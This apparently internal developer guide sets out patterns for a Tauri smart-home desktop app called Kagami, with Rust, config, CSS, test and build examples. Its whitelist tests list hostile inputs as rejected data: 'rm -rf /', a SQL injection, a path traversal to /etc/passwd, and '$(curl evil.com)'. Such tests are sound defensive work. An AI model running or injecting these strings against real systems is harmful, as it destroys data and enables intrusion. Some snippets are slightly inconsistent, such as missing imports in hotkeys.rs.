# Desktop Platform Skill (Tauri)

**100/100 Quality by Default** - Patterns for production-ready Tauri desktop apps.

## When to Use

- Creating or modifying desktop apps in `apps/desktop/`
- Ensuring Tauri-specific quality standards
- Byzantine audit remediation for Desktop

## Required Files (P0)

Every Tauri desktop app MUST have these files implemented (not empty):

```
kagami-client/
├── src-tauri/
│   ├── Cargo.toml              # Rust dependencies
│   ├── tauri.conf.json         # App configuration
│   ├── entitlements.plist      # macOS entitlements (NO MERGE CONFLICTS)
│   ├── capabilities/
│   │   └── default.json        # Tauri permissions
│   ├── src/
│   │   ├── main.rs             # Entry point
│   │   ├── lib.rs              # Library exports (NOT EMPTY)
│   │   ├── app.rs              # App setup
│   │   ├── commands.rs         # Tauri commands (NOT EMPTY)
│   │   ├── tray.rs             # System tray (NOT EMPTY)
│   │   ├── hotkeys.rs          # Global hotkeys (NOT EMPTY)
│   │   ├── api_client.rs       # API communication
│   │   ├── cache.rs            # Response caching
│   │   ├── circuit_breaker.rs  # Failure handling
│   │   └── commands/
│   │       ├── mod.rs          # Command exports
│   │       ├── smart_home.rs   # Home control
│   │       └── windows.rs      # Window management
│   └── tests/
│       └── integration_tests.rs
├── src/
│   ├── index.html              # Main window
│   ├── command-palette.html    # Quick entry
│   ├── css/
│   │   └── design-system.css   # Design tokens
│   └── js/
│       └── app.js              # Frontend logic
├── tests/
│   ├── e2e/
│   │   └── user-flows.spec.ts  # Playwright tests
│   └── visual/
│       └── views.spec.ts       # Visual regression
└── package.json
```

## Critical Patterns

### 1. No Empty Rust Files (MANDATORY)

Every module must have actual implementation:

```rust
// src-tauri/src/lib.rs - MUST NOT BE EMPTY
pub mod app;
pub mod api_client;
pub mod cache;
pub mod circuit_breaker;
pub mod commands;
pub mod hotkeys;
pub mod tray;

pub use app::*;
pub use api_client::*;
```

```rust
// src-tauri/src/tray.rs - MUST NOT BE EMPTY
use tauri::{
    menu::{Menu, MenuItem},
    tray::{TrayIcon, TrayIconBuilder},
    AppHandle, Manager,
};

pub fn create_tray(app: &AppHandle) -> Result<TrayIcon, tauri::Error> {
    let menu = Menu::with_items(app, &[
        &MenuItem::with_id(app, "show", "Show Kagami", true, None::<&str>)?,
        &MenuItem::with_id(app, "movie_mode", "Movie Mode", true, None::<&str>)?,
        &MenuItem::with_id(app, "quit", "Quit", true, None::<&str>)?,
    ])?;

    TrayIconBuilder::new()
        .icon(app.default_window_icon().unwrap().clone())
        .menu(&menu)
        .on_menu_event(|app, event| {
            match event.id.as_ref() {
                "show" => {
                    if let Some(window) = app.get_webview_window("main") {
                        let _ = window.show();
                        let _ = window.set_focus();
                    }
                }
                "movie_mode" => {
                    // Activate movie mode
                }
                "quit" => {
                    app.exit(0);
                }
                _ => {}
            }
        })
        .build(app)
}
```

```rust
// src-tauri/src/hotkeys.rs - MUST NOT BE EMPTY
use tauri::AppHandle;
use tauri_plugin_global_shortcut::{GlobalShortcutExt, Shortcut};

pub fn register_hotkeys(app: &AppHandle) -> Result<(), Box<dyn std::error::Error>> {
    let shortcut = Shortcut::new(Some(Modifiers::SUPER | Modifiers::SHIFT), Code::KeyK);

    app.global_shortcut().register(shortcut)?;
    app.global_shortcut().on_shortcut(shortcut, |app, _, _| {
        // Show quick entry window
        if let Some(window) = app.get_webview_window("quick-entry") {
            let _ = window.show();
            let _ = window.set_focus();
        }
    });

    Ok(())
}
```

### 2. Clean Entitlements (MANDATORY - NO MERGE CONFLICTS)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <!-- Hardened Runtime -->
    <key>com.apple.security.app-sandbox</key>
    <false/>

    <key>com.apple.security.cs.allow-jit</key>
    <false/>

    <key>com.apple.security.cs.allow-unsigned-executable-memory</key>
    <false/>

    <key>com.apple.security.cs.disable-library-validation</key>
    <false/>

    <!-- Network access -->
    <key>com.apple.security.network.client</key>
    <true/>

    <!-- Microphone for voice -->
    <key>com.apple.security.device.audio-input</key>
    <true/>
</dict>
</plist>
```

### 3. API Client with Circuit Breaker (MANDATORY)

```rust
// src-tauri/src/api_client.rs
use reqwest::{Client, StatusCode};
use serde::{Deserialize, Serialize};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::RwLock;

pub struct KagamiAPI {
    client: Client,
    base_url: String,
    circuit_breaker: Arc<CircuitBreaker>,
    cache: Arc<RwLock<Cache>>,
}

impl KagamiAPI {
    pub fn new(base_url: &str) -> Result<Self, ApiError> {
        let client = Client::builder()
            .timeout(Duration::from_secs(10))
            .pool_max_idle_per_host(5)
            .tcp_nodelay(true)
            .gzip(true)
            .build()
            .map_err(|e| ApiError::ClientError(e.to_string()))?;

        Ok(Self {
            client,
            base_url: base_url.to_string(),
            circuit_breaker: Arc::new(CircuitBreaker::new()),
            cache: Arc::new(RwLock::new(Cache::new())),
        })
    }

    pub async fn health(&self) -> Result<ApiHealth, ApiError> {
        // Check circuit breaker
        if !self.circuit_breaker.allow_request() {
            return Err(ApiError::CircuitOpen);
        }

        // Check cache
        let cache = self.cache.read().await;
        if let Some(cached) = cache.get("health") {
            return Ok(cached.clone());
        }
        drop(cache);

        // Make request
        let result = self.client
            .get(&format!("{}/health", self.base_url))
            .send()
            .await;

        match result {
            Ok(response) if response.status().is_success() => {
                self.circuit_breaker.record_success();
                let health: ApiHealth = response.json().await?;

                // Verify safety constraint
                if let Some(h_x) = health.safety_score {
                    if h_x < 0.0 {
                        return Err(ApiError::SafetyViolation);
                    }
                }

                // Cache result
                self.cache.write().await.set("health", health.clone());
                Ok(health)
            }
            Ok(response) => {
                self.circuit_breaker.record_failure();
                Err(ApiError::HttpError(response.status().as_u16()))
            }
            Err(e) => {
                self.circuit_breaker.record_failure();
                Err(ApiError::NetworkError(e.to_string()))
            }
        }
    }
}
```

### 4. Tauri Commands with Validation (MANDATORY)

```rust
// src-tauri/src/commands/smart_home.rs
use tauri::State;

// Whitelist of allowed actions
const ALLOWED_ACTIONS: &[&str] = &[
    "lights/set",
    "shades/open",
    "shades/close",
    "fireplace/on",
    "fireplace/off",
    "movie-mode/enter",
    "movie-mode/exit",
    "goodnight",
    "welcome-home",
];

#[tauri::command]
pub async fn execute_smart_home_action(
    action: String,
    params: serde_json::Value,
    api: State<'_, KagamiAPI>,
) -> Result<serde_json::Value, String> {
    // Validate action is in whitelist
    if !ALLOWED_ACTIONS.contains(&action.as_str()) {
        return Err(format!("Action '{}' not allowed", action));
    }

    // Execute via API
    api.execute_action(&action, params)
        .await
        .map_err(|e| e.to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_action_whitelist() {
        assert!(ALLOWED_ACTIONS.contains(&"lights/set"));
        assert!(!ALLOWED_ACTIONS.contains(&"rm -rf /"));
        assert!(!ALLOWED_ACTIONS.contains(&"'; DROP TABLE users;--"));
    }
}
```

### 5. Design System CSS (MANDATORY)

```css
/* src/css/design-system.css */
:root {
    /* Fibonacci spacing */
    --space-1: 2px;
    --space-2: 4px;   /* Fib: 3 rounded */
    --space-3: 8px;   /* Fib: 8 */
    --space-4: 16px;  /* Fib: 13 rounded */
    --space-5: 24px;  /* Fib: 21 rounded */
    --space-6: 40px;  /* Fib: 34 rounded */
    --space-7: 64px;  /* Fib: 55 rounded */

    /* Fibonacci animation durations */
    --duration-instant: 89ms;
    --duration-fast: 144ms;
    --duration-normal: 233ms;
    --duration-slow: 377ms;
    --duration-slower: 610ms;

    /* Colony colors */
    --spark-primary: #FF6B35;
    --forge-primary: #2196F3;
    --flow-primary: #4CAF50;
    --guard-primary: #F44336;

    /* WCAG AA compliant text */
    --text-primary: rgba(255, 255, 255, 0.95);
    --text-secondary: rgba(255, 255, 255, 0.7);
    --text-muted: rgba(255, 255, 255, 0.5);

    /* Dark theme */
    --bg-primary: #0a0a0a;
    --bg-secondary: #141414;
    --bg-tertiary: #1e1e1e;
}

/* Focus states for accessibility */
:focus-visible {
    outline: 3px solid var(--spark-primary);
    outline-offset: 3px;
}

/* Reduced motion support */
@media (prefers-reduced-motion: reduce) {
    *,
    *::before,
    *::after {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.01ms !important;
    }
}

/* Minimum touch targets */
button,
[role="button"],
input[type="checkbox"],
input[type="radio"] {
    min-width: 44px;
    min-height: 44px;
}
```

### 6. Tauri Configuration (MANDATORY)

```json
{
  "$schema": "../node_modules/@tauri-apps/cli/config.schema.json",
  "productName": "Kagami",
  "identifier": "com.kagami.desktop",
  "version": "0.1.0",
  "build": {
    "frontendDist": "../src"
  },
  "app": {
    "withGlobalTauri": true,
    "windows": [
      {
        "label": "main",
        "title": "Kagami",
        "width": 1200,
        "height": 800,
        "minWidth": 800,
        "minHeight": 600,
        "resizable": true,
        "fullscreen": false,
        "decorations": true,
        "transparent": false
      },
      {
        "label": "quick-entry",
        "title": "Quick Entry",
        "width": 600,
        "height": 400,
        "center": true,
        "resizable": false,
        "decorations": false,
        "transparent": true,
        "visible": false,
        "alwaysOnTop": true
      }
    ],
    "trayIcon": {
      "iconPath": "icons/icon.png",
      "iconAsTemplate": true
    },
    "security": {
      "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self' http://kagami.local:8001 ws://kagami.local:8001"
    }
  },
  "bundle": {
    "active": true,
    "targets": "all",
    "icon": [
      "icons/32x32.png",
      "icons/128x128.png",
      "icons/icon.icns",
      "icons/icon.ico"
    ],
    "macOS": {
      "entitlements": "./entitlements.plist",
      "minimumSystemVersion": "12.0"
    }
  }
}
```

## Testing Requirements

### Rust Integration Tests (Required)

```rust
// src-tauri/tests/integration_tests.rs
#[cfg(test)]
mod tests {
    use kagami_client::*;

    #[test]
    fn test_action_whitelist_security() {
        let malicious_actions = vec![
            "rm -rf /",
            "'; DROP TABLE users;--",
            "../../../etc/passwd",
            "$(curl evil.com)",
        ];

        for action in malicious_actions {
            assert!(!ALLOWED_ACTIONS.contains(&action));
        }
    }

    #[tokio::test]
    async fn test_circuit_breaker() {
        let cb = CircuitBreaker::new();
        assert!(cb.allow_request());

        // Record failures
        for _ in 0..5 {
            cb.record_failure();
        }

        // Should be open
        assert!(!cb.allow_request());
    }
}
```

### Playwright E2E Tests (Required)

```typescript
// tests/e2e/user-flows.spec.ts
import { test, expect } from '@playwright/test';

test.describe('Quick Entry', () => {
    test('opens with keyboard shortcut', async ({ page }) => {
        await page.goto('/');
        await page.keyboard.press('Meta+Shift+K');
        await expect(page.locator('.quick-entry')).toBeVisible();
    });

    test('accepts voice commands', async ({ page }) => {
        await page.goto('/command-palette.html');
        await page.click('[data-testid="voice-input"]');
        // Test voice input flow
    });
});

test.describe('Accessibility', () => {
    test('all interactive elements are keyboard accessible', async ({ page }) => {
        await page.goto('/');
        await page.keyboard.press('Tab');
        const focused = page.locator(':focus');
        await expect(focused).toBeVisible();
    });

    test('focus indicators are visible', async ({ page }) => {
        await page.goto('/');
        await page.keyboard.press('Tab');
        const outline = await page.evaluate(() => {
            const el = document.activeElement;
            return window.getComputedStyle(el!).outline;
        });
        expect(outline).not.toBe('none');
    });
});
```

## Build Verification

```bash
# Verify Desktop build passes
cd apps/desktop/kagami-client

# Check for merge conflicts in critical files
grep -r "<<<<<<" src-tauri/ && echo "MERGE CONFLICTS FOUND!" && exit 1

# Rust build
cd src-tauri && cargo build --release

# Frontend build
npm install && npm run build

# Tauri build
npm run tauri build

# Run Rust tests
cargo test

# Run E2E tests
npx playwright test
```

## Quality Checklist

Before any Desktop commit:

- [ ] No merge conflicts in `entitlements.plist`
- [ ] `lib.rs` exports all modules (not empty)
- [ ] `tray.rs` creates system tray menu
- [ ] `hotkeys.rs` registers global shortcuts
- [ ] `commands.rs` has whitelist validation
- [ ] All windows defined in `tauri.conf.json`
- [ ] CSP configured for security
- [ ] Rust tests pass
- [ ] Playwright tests pass
- [ ] No `expect()` calls that could panic

## Common Issues & Fixes

### Merge Conflict in Entitlements
- **Symptom**: Build fails with XML parse error
- **Fix**: Resolve conflict markers, keep hardened runtime settings

### Empty Rust Files
- **Symptom**: `unresolved import` errors
- **Fix**: Implement all module stubs with real code

### Circuit Breaker Stuck
- **Symptom**: No requests after failures
- **Fix**: Implement half-open state with recovery

---

*100/100 or don't ship.*
